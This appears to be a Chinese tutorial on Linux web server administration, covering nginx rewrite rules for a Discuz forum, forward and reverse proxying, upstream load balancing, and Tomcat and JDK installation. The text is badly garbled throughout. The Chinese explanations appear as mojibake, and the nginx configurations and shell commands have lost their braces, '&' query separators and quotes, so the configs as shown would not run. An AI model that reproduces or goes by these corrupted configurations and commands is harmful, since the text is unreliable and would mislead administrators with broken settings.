2016 readme.html...# æˆæƒ[root@web01 wp]# chown -R nginx:nginx .[root@web01 wp]# llæ€»ç”¨é‡ 9764-rw-rw-r-- 1 nginx nginx 418 8æœˆ 17 2016 index.php-rw-rw-r-- 1 nginx nginx 19935 8æœˆ 17 2016 license.txt-rw-rw-r-- 1 nginx nginx 7342 8æœˆ 17 2016 readme.html...# å¥½ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ä¿®æ”¹ä¸€ä¸‹hostsæ–‡ä»¶äº†192.168.61.139 wulaoban.com wp.jaden.com 3.22 ä¼ªé™æ€## çº¯é™æ€ç½‘ç«™ï¼Œç‰¹ç‚¹ï¼šæ²¡æœ‰äº¤äº’ã€å®‰å…¨æ€§å¥½ã€é€Ÿåº¦å¿«ã€æ–¹ä¾¿SEO # æ¯ä¸ªé¡µé¢éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„urlåœ°å€ï¼Œæ¯”å¦‚ï¼š https://www.cnblogs.com/clschao/articles/10526431.html https://www.cnblogs.com/clschao/articles/10391859.html # ä¸åŒçš„htmlæ–‡ä»¶çœ‹åˆ°ä¸€ä¸ªä¸åŒçš„ç½‘é¡µ ## åŠ¨æ€ç½‘ç«™ï¼Œç‰¹ç‚¹ï¼šæœ‰äº¤äº’ã€å®‰å…¨æ€§ç›¸å¯¹å·®ï¼Œé€Ÿåº¦ç›¸å¯¹æ…¢ã€ä¸æ–¹ä¾¿SEO http://bbs.jaden.com/forum.php?mod=forumdisplayfid=2 http://bbs.jaden.com/forum.php?mod=viewthreadtid=1extra=page%3D1 # http://bbs.jaden.com/forum.phpç½‘å€æ˜¯ä¸€æ ·çš„ï¼Œä¹Ÿå°±æ˜¯æœåŠ¡ç«¯æ‰¾çš„æ˜¯åŒä¸€ä¸ªphpæ–‡ä»¶ï¼Œä½†æ˜¯ä½ ä¼šå‘ç°é¡µé¢çš„æ•°æ®ä¸åŒäº†ã€‚ # åŠ¨æ€ç½‘ç«™å°±æ˜¯æœåŠ¡ç«¯æ ¹æ®å®¢æˆ·ç«¯çš„ç½‘ç»œè¯·æ±‚æ•°æ®ä¸­çš„æŸ¥è¯¢å‚æ•°æ•°æ®æ¥åŠ¨æ€çš„ç»™è¿™ä¸ªphpæ–‡ä»¶åŠ å…¥ä¸åŒçš„åŠ¨æ€æ•°æ® ## ä¼ªé™æ€ï¼Œç‰¹ç‚¹ï¼šæœ‰äº¤äº’ã€ä¸å®‰å…¨ã€æœ€é€Ÿæœ€æ…¢ã€æ–¹ä¾¿SEO # å®é™…ä¸Šè¿˜æ˜¯åŠ¨æ€ç½‘ç«™ï¼Œåªä¸è¿‡æ˜¯åšæˆäº†é™æ€é¡µé¢çš„ç½‘å€æ•ˆæœã€‚ ## æ¯”å¦‚ï¼šhttp://bbs.jaden.com/forum.php?mod=forumdisplayfid=2å¯èƒ½å°±å˜æˆäº†ï¼šhttp://bbs.jaden.com/2.htmlï¼Œç»“å°¾å˜æˆäº†htmlï¼Œå¹¶ä¸”æ²¡æœ‰æŸ¥è¯¢å‚æ•°äº†ï¼Œè€Œä¸”çœ‹ä¸Šå»æ˜¯ä¸€ä¸ªé¡µé¢ä¸€ä¸ªhtmlæ–‡ä»¶ discuzè®ºå›é…ç½®ä¼ªé™æ€ nginxæ·»åŠ ä¼ªé™æ€çš„è§„åˆ™ [root@web01 conf.d]# cat discuz.conf server listen 80; server_name bbs.jaden.com; location / root /html/bbs; index index.php index.html index.htm; rewrite ^([^\\.]*)/topic-(.+)\\.html$ $1/portal.php?mod=topictopic=$2 last; rewrite ^([^\\.]*)/article-([0-9]+)-([0-9]+)\\.html$ $1/portal.php?mod=viewaid=$2page=$3 last; rewrite ^([^\\.]*)/forum-(\\w+)-([0-9]+)\\.html$ $1/forum.php?mod=forumdisplayfid=$2page=$3 last; rewrite ^([^\\.]*)/thread-([0-9]+)-([0-9]+)-([0-9]+)\\.html$ $1/forum.php?mod=viewthreadtid=$2extra=page%3D$4page=$3 last; rewrite ^([^\\.]*)/group-([0-9]+)-([0-9]+)\\.html$ $1/forum.php?mod=groupfid=$2page=$3 last; rewrite ^([^\\.]*)/space-(username|uid)-(.+)\\.html$ $1/home.php?mod=space$2=$3 last; rewrite ^([^\\.]*)/blog-([0-9]+)-([0-9]+)\\.html$ $1/home.php?mod=spaceuid=$2do=blogid=$3 last; rewrite ^([^\\.]*)/(fid|tid)-([0-9]+)\\.html$ $1/archiver/index.php?action=$2value=$3 last; rewrite ^([^\\.]*)/([a-z]+[a-z0-9_]*)-([a-z0-9_\\-]+)\\.html$ $1/plugin.php?id=$2:$3 last; if (!-e $request_filename) return 404; location ~ \\.php$ root /html/bbs; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /html/bbs$fastcgi_script_name; include fastcgi_params; ä¼ªé™æ€çš„åŸç† ## nginxä¼šé€šè¿‡rewriteæ¥é‡å†™ä¸€ä»½æ–°çš„urlï¼Œäº§ç”Ÿä¸€ä¸ªåŠ¨æ€çš„urlæ¥å®ŒæˆåŠ¨æ€é¡µé¢çš„æ•ˆæœ## é»˜è®¤æ¨¡å—é¡µé¢ï¼š ## åŠ¨æ€urlï¼šhttp://bbs.jaden.com/forum.php?mod=forumdisplayfid=2page=1 ## ä¼ªé™æ€urlï¼šhttp://bbs.jaden.com/forum-2-1.html ## è§„åˆ™ï¼šrewrite ^([^\\.]*)/forum-(\\w+)-([0-9]+)\\.html$ $1/forum.php?mod=forumdisplayfid=$2page=$3 last; ## http://bbs.jaden.com/forum.php?mod=forumdisplayfid=2page=1 ## å¸–å­ï¼š## åŠ¨æ€ï¼šhttp://bbs.jaden.com/forum.php?mod=viewthreadtid=1extra=page%3D1## ä¼ªé™æ€ï¼šhttp://bbs.jaden.com/thread-1-1-1.html ## è§„åˆ™ï¼šrewrite ^([^\\.]*)/thread-([0-9]+)-([0-9]+)-([0-9]+)\\.html$ $1/forum.php?mod=viewthreadtid=$2extra=page%3D$4page=$3 last; 3.23 æ­£å‘ä»£ç†å®¢æˆ·ç«¯ä½¿ç”¨çš„ä»£ç†æˆ‘ä»¬ä¸€èˆ¬ç§°ä¹‹ä¸ºæ­£å‘ä»£ç†ï¼ŒæœåŠ¡ç«¯ä½¿ç”¨çš„ä»£ç†æˆ‘ä»¬ä¸€èˆ¬ç§°ä¹‹ä¸ºåå‘ä»£ç†ã€‚ å®¢æˆ·ç«¯å¦‚æœä½¿ç”¨äº†æ­£å‘ä»£ç†ï¼Œé‚£ä¹ˆæœåŠ¡ç«¯è®°å½•çš„æ˜¯ä»£ç†çš„ipåœ°å€ï¼Œä»£ç†å¯ä»¥æœ‰å¾ˆå¤šå±‚ï¼Œè€Œä¸”å¾ˆå¤šç½‘ç»œæ˜¯ æ­£å‘ä»£ç†å’Œåå‘ä»£ç†éƒ½å­˜åœ¨ã€‚ æ¯”å¦‚å®¢æˆ·ç«¯ç«ç‹æµè§ˆå™¨é…ç½®ä»£ç†çš„åœ°æ–¹ï¼š åªè¦ä½¿ç”¨äº†ä»£ç†ï¼Œé‚£ä¹ˆä»¥åçš„è®¿é—®éƒ½ä¼šèµ°ä»£ç†ï¼Œè€Œä¸ä¼šå†ç›´æ¥å‘é€ç»™æœåŠ¡ç«¯ã€‚ç«ç‹æµè§ˆå™¨å¯ä»¥è®¾ç½®è‡ªå·±ä½¿ç”¨ä»£ç†ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ç³»ç»Ÿä»£ç†ï¼š æˆ‘ä»¬åšä¸€ä¸ªæ­£å‘ä»£ç†è¯•è¯•ã€‚ é¦–å…ˆæ‰¾ä¸€å°æœåŠ¡å™¨ï¼Œæ¯”å¦‚æˆ‘ç”¨é˜¿é‡Œäº‘çš„ä¸€å°æœåŠ¡å™¨ä½œä¸ºæ­£å‘ä»£ç†æœåŠ¡å™¨å§ï¼Œå®‰è£…ä¸€ä¸ªcentos7.8ï¼Œç„¶åå®‰è£…ä¸ªnginx # yum install nginx -y# å»æ‰é…ç½®ç”¨çš„#å·è¡Œå’Œç©ºè¡Œ[root@web01 conf.d]# grep -Ev ^$|# /etc/nginx/nginx.conf.default /etc/nginx/nginx.conf[root@web01 conf.d]# vim /etc/nginx/nginx.conf# ä¿®æ”¹nginxçš„é…ç½®åˆ†åˆ«æ·»åŠ httpå’Œhttpsçš„serverï¼Œå…¶ä»–é…ç½®ä¿æŒä¸å˜ï¼Œæˆ‘ä»¬å°±æ·»åŠ ä¸ªhttpçš„æ¼”ç¤ºä¸€ä¸‹å³å¯# å°†nginx.confé…ç½®ä¸­çš„serveréƒ¨åˆ†æ›¿æ¢ä¸ºä¸‹é¢çš„server# ä¸‹é¢é…ç½®æ­£å‘ä»£ç†è½¬å‘httpè¯·æ±‚server resolver 223.5.5.5; listen 80; location / proxy_pass http://$host$request_uri; proxy_set_header HOST $host; proxy_buffers 256 4k; proxy_max_temp_file_size 0k; proxy_connect_timeout 30; proxy_send_timeout 60; proxy_read_timeout 60; proxy_next_upstream error timeout invalid_header http_502; # nginx -t# systemctl restart nginx# è¿™æ—¶å€™çš„nginxå°±ä¸ä»£è¡¨ä¸€ä¸ªç½‘ç«™äº†ï¼Œåªæ˜¯å¸®æˆ‘ä»¬è¿›è¡Œè¯·æ±‚çš„è½¬å‘ï¼Œå°±æ˜¯å•çº¯çš„ä»£ç†ã€‚ é€šè¿‡å®æ—¶æŸ¥çœ‹nginxçš„è®¿é—®æ—¥å¿—ï¼Œå¯ä»¥çœ‹åˆ°Windowsä¸‹è®¾ç½®ä»£ç†IPå’Œç«¯å£åï¼Œæœ¬åœ°ç”µè„‘è®¿é—®çš„æ‰€æœ‰ç½‘é¡µä¼šé€šè¿‡ä»£ç†æœåŠ¡å™¨è¿›è¡Œè®¿é—®ç½‘é¡µï¼Œå®ç°äº†æ­£å‘ä»£ç†çš„åŠŸèƒ½ï¼Œå¹¶ä¸”éšè—äº†ç”¨æˆ·è‡ªå·±çœŸå®çš„IPã€‚ 3.24 åå‘ä»£ç†åå‘ä»£ç†æ›´å¤šçš„æ—¶å€™æ˜¯ä¸ºäº†ä¿æŠ¤åŸç«™ï¼Œè¿˜èƒ½ç”¨äºè´Ÿè½½å‡è¡¡çš„æ•ˆæœ æˆ‘ä»¬å†å»å…‹éš†ä¸€ä¸ªè™šæ‹Ÿæœºä½œä¸ºåå‘ä»£ç†æœåŠ¡å™¨ï¼Œä½¿ç”¨nginxä½œä¸ºåå‘ä»£ç†å·¥å…·ï¼Œå®‰è£…nginxï¼Œé…ç½®å¦‚ä¸‹ï¼š [root@lb01 ~]# cat /etc/nginx/nginx.confworker_processes 1;events worker_connections 1024;http include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; server listen 80; server_name localhost; location / proxy_pass http://192.168.61.140; # å°†è¯·æ±‚è½¬å‘åˆ°å“ªä¸ªipåœ°å€ï¼ŒåŸç«™çš„ipåœ°å€ï¼Œå¹¶ä¸”å…¶å®æˆ‘ä»¬æ­£å¸¸çš„è¯æ˜¯åº”è¯¥åŠ ä¸€ä¸ªDNSè§£æè®°å½•ï¼Œå°†æˆ‘ä»¬çš„åŸŸåæŒ‡å‘è¿™ä¸ªä»£ç†æœåŠ¡å™¨çš„ipåœ°å€ã€‚æˆ‘ä»¬æ²¡æœ‰çœŸå®å…¬ç½‘ä¸»æœºæ¥æ¼”ç¤ºï¼Œæ‰€ä»¥æ”¹ä¸€ä¸‹hostsæ–‡ä»¶çš„è®°å½•å³å¯ï¼Œå°†åŸæ¥çš„åŸŸåéƒ½æŒ‡å‘è¿™ä¸ªä»£ç†ä¸»æœºçš„ipåœ°å€ã€‚ç„¶åè®¿é—®ç½‘ç«™ï¼ŒwiresharkæŠ“åŒ…å°±èƒ½çœ‹åˆ°è½¬å‘æ•ˆæœã€‚ # å¦‚æœåªæ˜¯å•çº¯çš„é…ç½®ä¸Šé¢è¿™å¥è¯ä¹Ÿå¯ä»¥å®Œæˆåå‘ä»£ç†ï¼Œä½†æ˜¯æœåŠ¡ç«¯çš„å…¶ä»–ç½‘ç«™å°±æ²¡åŠæ³•è®¿é—®åˆ°äº†ï¼Œå› ä¸ºnginxè½¬å‘çš„æ—¶å€™ï¼Œä¼šç”¨å®¢æˆ·ç«¯è¯·æ±‚çš„æœåŠ¡å™¨çš„ipåœ°å€ï¼Œä¸ä¼šç”¨åŸŸåï¼ŒåŸŸåä¸¢äº†ï¼Œé‚£ä¹ˆæœåŠ¡ç«¯çš„nginxä¼šè‡ªåŠ¨æ‰“å¼€ä¸€ä¸ªç½‘ç«™ç»™ä½ å“åº”ã€‚æ‰€ä»¥è¿˜æ˜¯è¦è®¾ç½®ä¸€ä¸‹nginxè½¬å‘æ—¶çš„hostè¯·æ±‚å¤´ï¼Œè®©å®ƒå˜æˆåŸŸåã€‚ proxy_set_header Host $host; # è®¾ç½®hostï¼Œä»¥é˜²è¯·æ±‚åŸŸåä¸¢å¤±ã€‚ #proxy_set_header jaden 666666; # å¯ä»¥è‡ªå®šå®šåˆ¶å¤šä¸ªè½¬å‘è¯·æ±‚æ—¶çš„è¯·æ±‚å¤´é”®å€¼å¯¹ # ä¸‹é¢è¿™ä¸¤ä¸ªä¸»è¦æ˜¯ä¸ºäº†è®°å½•å®¢æˆ·ç«¯çš„çœŸå®ipåœ°å€ï¼Œå› ä¸ºæœ‰äº†åå‘ä»£ç†ä¹‹åï¼Œæˆ‘ä»¬çœ‹åˆ°è®°å½•çš„å®¢æˆ·ç«¯çš„ipåœ°å€æ˜¯åå‘ä»£ç†æœåŠ¡å™¨çš„ipåœ°å€ï¼Œè¿™æ ·è‚¯å®šä¸è¡Œå‘€ï¼Œæ— æ³•å®šä½è°æ”»å‡»çš„æˆ‘ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è®°å½•ç”¨æˆ·çš„çœŸå®ipï¼Œæ‰€ä»¥å°±å¯ä»¥åœ¨nginxè½¬å‘è¯·æ±‚çš„æ—¶å€™åŠ ä¸¤ä¸ªè¯·æ±‚å¤´é”®å€¼å¯¹ï¼Œå°†å®¢æˆ·ç«¯çœŸå®ipå†™è¿›å» proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $remote_addr; # è¿™ä¸ªç®€ç§°å«åšXFFï¼Œä¸šå†…ä¸€èˆ¬éƒ½ç”¨è¿™ä¸ªå­—æ®µæ¥è®°å½•å®¢æˆ·ç«¯çœŸå®ipåœ°å€ï¼Œä¹Ÿæœ‰ç”¨ä¸Šé¢è¿™ä¸ªremote_addræ¥è®°å½•çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éƒ½é…ç½®ä¸Šå§ï¼Œå°†nginxçš„æ—¥å¿—è®°å½•æ ¼å¼ä¿®æ”¹ä¸€ä¸‹ï¼ŒåŠ ä¸Šä¸€ä¸ªçœŸå®ipï¼š$http_x_forwarded_for #proxy_set_header X-Forwarded-For $http_x_forwarded_for; # åç«¯æœåŠ¡å™¨æ—¥å¿—æ ¼å¼,vim /etc/nginx/nginx.confï¼ŒåŠ ä¸Šå¦‚ä¸‹ä¸¤æ¡log_format main $remote_addr - $remote_user [$time_local] $request $http_host $status $body_bytes_sent $http_referer $http_user_agent $http_x_forwarded_for;access_log /var/log/nginx/new.log main; # ç»™æ‰€æœ‰ç½‘ç«™å®šä¹‰æ—¥å¿—æ ¼å¼ç”¨çš„# ä¿å­˜é€€å‡ºï¼Œç„¶åè®¿é—®ç½‘ç«™ï¼Œå°±çœ‹åˆ°æ—¥å¿—äº†ã€‚ ä¹‹å‰çš„ç½‘ç«™æœåŠ¡å™¨ä½œä¸ºåŸç«™æœåŠ¡å™¨ï¼Œç„¶åæˆ‘ä»¬è‡ªå·±çš„ç‰©ç†æœºä½œä¸ºå®¢æˆ·ç«¯è®¿é—®ã€‚ 3.25 è´Ÿè½½å‡è¡¡nginxåšåå‘ä»£ç†çš„åŒæ—¶ï¼Œè¿˜å¯ä»¥é…ç½®è´Ÿè½½å‡è¡¡ï¼Œä¸ºäº†æ¼”ç¤ºè´Ÿè½½å‡è¡¡çš„æ•ˆæœï¼Œæˆ‘ä»¬å†åˆ›å»ºä¸€ä¸ªwebç½‘ç«™æœåŠ¡å™¨ã€‚è€Œä¸”è¦ä¿è¯è¿™ä¸¤å°webæœåŠ¡å™¨è·‘ç€ç›¸åŒçš„ç½‘ç«™ã€‚ä¸¤ä¸ªç½‘ç«™ç®€å•å†™ä¸€äº›ä¸å¤ªä¸€æ ·çš„ä¸œè¥¿ï¼Œä¸ºäº†æ˜¯è®©å¤§å®¶çœ‹æ•ˆæœã€‚ ä¿®æ”¹nginxåå‘ä»£ç†çš„é…ç½®ï¼š http include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; upstream web server 192.168.61.140; server 192.168.61.141; server listen 80; server_name localhost; location / proxy_pass http://web; # è¿™ä¸ªåœ°æ–¹ä¸å†™æ­»ipåœ°å€äº†ï¼Œå†™ä¸ªä¸Šé¢é…ç½®ä¸­çš„upstreamçš„åç§° proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $http_x_forwarded_for; 3.26 Tomcat3.26.1 Tomcatå®‰è£…Javaä»‹ç» # javaæ˜¯sunå…¬å¸å¼€å‘ï¼Œåæ¥sunå…¬å¸è¢«ç”²éª¨æ–‡oracleå…¬å¸æ”¶è´­äº†ï¼Œæ‰€ä»¥ç°åœ¨javaå±äºoracleå…¬å¸ã€‚æ¯ä¸ªandroidä¸Šé¢éƒ½æ˜¯è·‘çš„javaè™šæ‹Ÿæœºï¼Œè¿è¡Œç€å„ç§javaé¡¹ç›®ã€‚# jvmï¼šJava Virtual Machineï¼ŒåŠ æˆjvmï¼Œå«åšjavaè™šæ‹Ÿæœº# jreï¼šJava Runtime Environmentï¼Œç®€ç§°JREï¼Œå«åšjavaè¿è¡Œç¯å¢ƒï¼Œjreé‡Œé¢åŒ…å«jvmã€‚# jdkï¼šJava Development Kitï¼Œç®€ç§°jdkï¼Œå«åšjavaå¼€å‘å·¥å…·åŒ…ï¼ŒåŒ…å«jreå’Œå¾ˆå¤šå¼€å‘æ—¶ä¼šç”¨åˆ°çš„è¾…åŠ©è½¯ä»¶# å¦‚æœåªæ˜¯å•çº¯æƒ³è¿è¡Œjavaçš„é¡¹ç›®ï¼Œå°±å®‰è£…jreå³å¯ï¼Œå¦‚æœæƒ³å¼€å‘javaé¡¹ç›®æˆ–è€…é…åˆä¸€äº›å…¶ä»–å·¥å…·è½¯ä»¶æ¥ä½¿ç”¨ï¼Œé‚£å°±éœ€è¦å®‰è£…jdkï¼Œå¤§å®¶ä¸€èˆ¬éƒ½ä¼šå®‰è£…jdkã€‚# jdkæœ‰å¾ˆå¤šç‰ˆæœ¬ï¼šæ—©å…ˆjdk6æ¯”è¾ƒæµè¡Œï¼Œä½†æ˜¯æ¼æ´æ¯”è¾ƒå¤šï¼Œjdk6ï¼Œå®˜æ–¹å«åšjdk1.6ï¼Œåæ¥æœ‰äº†jdk7ï¼Œå®˜æ–¹å«åš1.7ï¼Œç›´æ¥jdk8ï¼Œjdk9ã€jdk10...ï¼Œæœ€æ–°ç‰ˆæœ¬ç°åœ¨æ˜¯jdk20äº†ï¼Œçœ‹å®˜ç½‘ï¼šhttps://www.oracle.com/java/technologies/downloads/ï¼Œjdk8ã€11ã€17éƒ½æ˜¯LTSé•¿æœŸæŠ€æœ¯æ”¯æŒç‰ˆæœ¬ï¼Œå¾ˆå¤šå…¬å¸éƒ½å–œæ¬¢ç”¨è¿™ç§é•¿æœŸæ”¯æŒç‰ˆæœ¬ã€‚è€é¡¹ç›®è¿˜æœ‰ä¸€äº›ç”¨çš„jdk6\\7ç­‰ï¼Œjdkæœ¬èº«æ¼æ´å°±æ¯”è¾ƒå¤šã€‚ æ–¹æ³•1ï¼šæˆ‘ä»¬å°±ä½¿ç”¨è¿™ä¸ªæ–¹æ³•æ¥å®‰è£…å§ï¼štomcatçš„è¿è¡Œéœ€è¦javaç¯å¢ƒï¼Œæ‰€ä»¥å…ˆå®‰è£…jdkã€‚ æŠŠå¦‚ä¸‹ä¸¤ä¸ªå®‰è£…åŒ…æ”¾åˆ°è™šæ‹Ÿæœºä¸Šï¼Œè¿™ä¸¤ä¸ªåŒ…æˆ‘éƒ½ç»™å¤§å®¶å‡†å¤‡å¥½äº†ã€‚ æŒ‰ç…§ä¸‹é¢çš„æ­¥éª¤è¿›è¡Œå®‰è£… # è¿™ä¸ªæ–¹æ³•é€‚ç”¨äºredhatç³»åˆ—çš„ç³»ç»Ÿ# æˆ‘ä»¬å…‹éš†ä¸€ä¸ªä¼˜åŒ–å¥½ä¹‹åçš„centos7.8è™šæ‹Ÿæœºæ¥å®‰è£…å§rpm -ivh jdk-8u102-linux-x64.rpm #8u102è¡¨ç¤ºjdk8ï¼Œuè¡¨ç¤ºæ›´æ–°ï¼Œ102è¡¨ç¤ºæ˜¯ç¬¬102æ¬¡æ›´æ–°ï¼Œæ¯æ¬¡æ›´æ–°éƒ½æ˜¯åœ¨è¡¥æ¼æ´mkdir /app -ptar xf apache-tomcat-8.0.27.tar.gz -C /app #apache-tomcat-8.0.27.tar.gzæ˜¯ç¼–è¯‘å¥½çš„tomcatç¨‹åºäº†ã€‚/app/apache-tomcat-8.0.27/bin/startup.sh # è§£å‹ä¹‹åï¼Œæ‰§è¡Œè¿™ä¸ªæŒ‡ä»¤å°±èƒ½å¯åŠ¨äº† tomcatå°±å®‰è£…å¥½äº†ï¼Œç›´æ¥æµè§ˆå™¨è®¿é—®å³å¯ï¼štomcatçš„é»˜è®¤ç«¯å£æ˜¯8080ï¼Œè®°ä½æ˜‚ï¼Œæˆ‘ä»¬å®‰è£…çš„æ˜¯8.0.72ç‰ˆæœ¬ï¼Œtomcatå±äºapacheåŸºé‡‘ä¼šçš„è½¯ä»¶ï¼Œæ‰€ä»¥å‰é¢ä¼šå¸¦æœ‰apacheå­—çœ¼ã€‚ æ–¹æ³•2ï¼šè¿™ç§æ–¹æ³•æ¯”è¾ƒç¹çï¼Œéœ€è¦é…ç½®ç¯å¢ƒå˜é‡ï¼Œå°†javaé…ç½®åˆ°ç¯å¢ƒå˜é‡ä¸­ï¼Œä¸ç„¶æ²¡åŠæ³•è¿è¡Œjavaã€‚æ–¹æ³•1è‡ªåŠ¨å¸®æˆ‘ä»¬é…ç½®äº† #è¿™ä¸ªæ–¹æ³•é€‚ç”¨äºdebianå’Œubuntuç­‰å…¶ä»–linuxå‘è¡Œç‰ˆï¼Œå…¶å®æ‰€æœ‰çš„linuxç³»ç»Ÿéƒ½å¯ä»¥ç”¨ä¸‹é¢çš„æ–¹å¼å®‰è£…tar xf jdk-8u60-linux-x64.tar.gz -C /app/ln -s /app/jdk1.8.0_60 /app/jdksed -i.ori $a export JAVA_HOME=/app/jdk export PATH=$JAVA_HOME/bin:$JAVA_HOME/jre/bin:$PATH export CLASSPATH=.$CLASSPATH:$JAVA_HOME/lib:$JAVA_HOME/jre/lib:$JAVA_HOME/lib/tools.jar /etc/profilesource /etc/profilemkdir /app/tar xf apache-tomcat-8.0.27.tar.gz -C /app/app/apache-tomcat-8.0.27/bin/startup.sh 3.26.2 tomcatç›®å½•ç»“æ„ä»‹ç»[root@tomcat apache-tomcat-8.0.27]# ll # å’Œlinuxç›®å½•æœ‰ç‚¹ç±»ä¼¼total 92drwxr-xr-x 2 root root 4096 Aug 3 03:05 bin #ä¸»è¦åŒ…å«å¯åŠ¨ã€å…³é—­tomcatè„šæœ¬å’Œè„šæœ¬ä¾èµ–æ–‡ä»¶ éå¸¸é‡è¦drwxr-xr-x 3 root root 198 Aug 3 03:05 conf #tomcaté…ç½®æ–‡ä»¶ç›®å½•ï¼Œé‡Œé¢éƒ½æ˜¯xmlæ ¼å¼çš„é…ç½®æ–‡ä»¶ éå¸¸é‡è¦drwxr-xr-x 2 root root 4096 Aug 3 03:05 lib #tomcatè¿è¡Œéœ€è¦åŠ è½½çš„jaråŒ…ï¼Œéƒ½æ˜¯ä¸€äº›å…³é”®æ’ä»¶ éå¸¸é‡è¦-rw-r--r-- 1 root root 57011 Sep 28 2015 LICENSE #licenseæ–‡ä»¶ï¼Œä¸é‡è¦drwxr-xr-x 2 root root 197 Aug 3 03:15 logs #åœ¨è¿è¡Œè¿‡ç¨‹ä¸­äº§ç”Ÿçš„æ—¥å¿—æ–‡ä»¶ éå¸¸é‡è¦-rw-r--r-- 1 root root 1444 Sep 28 2015 NOTICE #ä¸é‡è¦-rw-r--r-- 1 root root 6741 Sep 28 2015 RELEASE-NOTES #ç‰ˆæœ¬ç‰¹æ€§ï¼Œä¸é‡è¦-rw-r--r-- 1 root root 16204 Sep 28 2015 RUNNING.txt #å¸®åŠ©æ–‡ä»¶ï¼Œä¸é‡è¦drwxr-xr-x 2 root root 30 Aug 3 03:05 temp #å­˜æ”¾ä¸´æ—¶æ–‡ä»¶drwxr-xr-x 7 root root 81 Sep 28 2015 webapps #ç«™ç‚¹ç›®å½• éå¸¸é‡è¦drwxr-xr-x 3 root root 22 Aug 3 03:05 work #tomcatè¿è¡Œæ—¶äº§ç”Ÿçš„ç¼“å­˜æ–‡ä»¶[root@192 etc]# ls /app/apache-tomcat-8.0.27/ bin conf lib LICENSE logs NOTICE RELEASE-NOTES RUNNING.txt temp webapps work [root@192 etc]# ls /app/apache-tomcat-8.0.27/bin/ bootstrap.jar commons-daemon-native.tar.gz digest.sh startup.bat tool-wrapper.sh catalina.bat configtest.bat setclasspath.bat startup.sh version.bat catalina.sh configtest.sh setclasspath.sh tomcat\u0002juli.jar version.sh catalina-tasks.xml daemon.sh shutdown.bat tomcat\u0002native.tar.gz commons-daemon.jar digest.bat shutdown.sh tool\u0002wrapper.bat # binç›®å½•ä¸­çš„jaræ–‡ä»¶æ˜¯tomcatå¯åŠ¨æ—¶è‡ªåŠ¨åŠ è½½çš„ä¸€äº›å…³é”®æ–‡ä»¶ã€‚# .jarç»“å°¾çš„æ–‡ä»¶ï¼šjavaæºä»£ç æ‰“åŒ…å‡ºæ¥ä¹‹åéƒ½æ˜¯.jarç»“å°¾çš„æ–‡ä»¶ï¼Œå«åšjaråŒ…ï¼ŒjaråŒ…å°±æ˜¯ Java Archive Fileï¼Œé¡¾åæ€ä¹‰ï¼Œå®ƒçš„åº”ç”¨æ˜¯ä¸ Java æ¯æ¯ç›¸å…³çš„ï¼Œæ˜¯ Java çš„ä¸€ç§æ–‡æ¡£æ ¼å¼ï¼Œæ˜¯ä¸€ç§ä¸å¹³å°æ— å…³çš„æ–‡ä»¶æ ¼å¼ï¼Œå¯å°†å¤šä¸ªæ–‡ä»¶åˆæˆä¸€ä¸ªæ–‡ä»¶ã€‚jar åŒ…ä¸ zip åŒ…éå¸¸ç›¸ä¼¼â€”â€”å‡†ç¡®åœ°è¯´ï¼Œå®ƒå°±æ˜¯ zip åŒ…ï¼Œæ‰€ä»¥å«å®ƒæ–‡ä»¶åŒ…ã€‚jar ä¸ zip å”¯ä¸€çš„åŒºåˆ«å°±æ˜¯åœ¨ jar æ–‡ä»¶çš„å†…å®¹ä¸­ï¼ŒåŒ…å«äº†ä¸€ä¸ª META-INF/MANIFEST.MF æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶æ˜¯åœ¨ç”Ÿæˆ jar æ–‡ä»¶çš„æ—¶å€™è‡ªåŠ¨åˆ›å»ºçš„ï¼Œä½œä¸ºjaré‡Œé¢çš„è¯¦æƒ…å•ï¼ŒåŒ…å«äº†è¯¥JaråŒ…çš„ç‰ˆæœ¬ã€åˆ›å»ºäººå’Œç±»æœç´¢è·¯å¾„Class-Pathç­‰ä¿¡æ¯ï¼Œå½“ç„¶å¦‚æœæ˜¯å¯æ‰§è¡ŒJaråŒ…ï¼Œä¼šåŒ…å«Main-Classå±æ€§ï¼Œè¡¨æ˜Mainæ–¹æ³•å…¥å£ï¼Œå°¤å…¶æ˜¯è¾ƒä¸ºé‡è¦çš„Class-Pathå’ŒMain-Classã€‚jar åŒ…æ˜¯é€šè¿‡ JavaSE ç¨‹åºæ‰“æˆçš„åŒ…ï¼Œä¸€èˆ¬æ˜¯ä¸ºäº†å°†ä¸€äº›å…¬å…±çš„javaåŠŸèƒ½ä»£ç æ‰“åŒ…æˆä¸€ä¸ªjaråŒ…ï¼Œé‚£ä¹ˆå…¶ä»–é¡¹ç›®ç›´æ¥å¼•ç”¨è¿™ä¸ªjaråŒ…å°±èƒ½ä½¿ç”¨è¿™ä¸ªåŠŸèƒ½ã€‚# .xmlç»“å°¾çš„æ–‡ä»¶ï¼šå’Œhtmlå¾ˆç±»ä¼¼ï¼Œä¹Ÿæ˜¯ä¸€ç§æ ‡ç­¾è¯­è¨€ 3.26.3 Javaé¡¹ç›®çš„éƒ¨ç½²3-1 ä½¿ç”¨waråŒ…ä¸æ˜¯zrlogzrlogæ˜¯ä¸ªåšå®¢ç½‘ç«™ï¼Œæˆ‘ä»¬å¯ä»¥ä¸‹è½½æ¥éƒ¨ç½²ä¸€ä¸‹ï¼Œè¿™ä¸ªç½‘ç«™ä¼šç”¨åˆ°æ•°æ®åº“ã€‚ 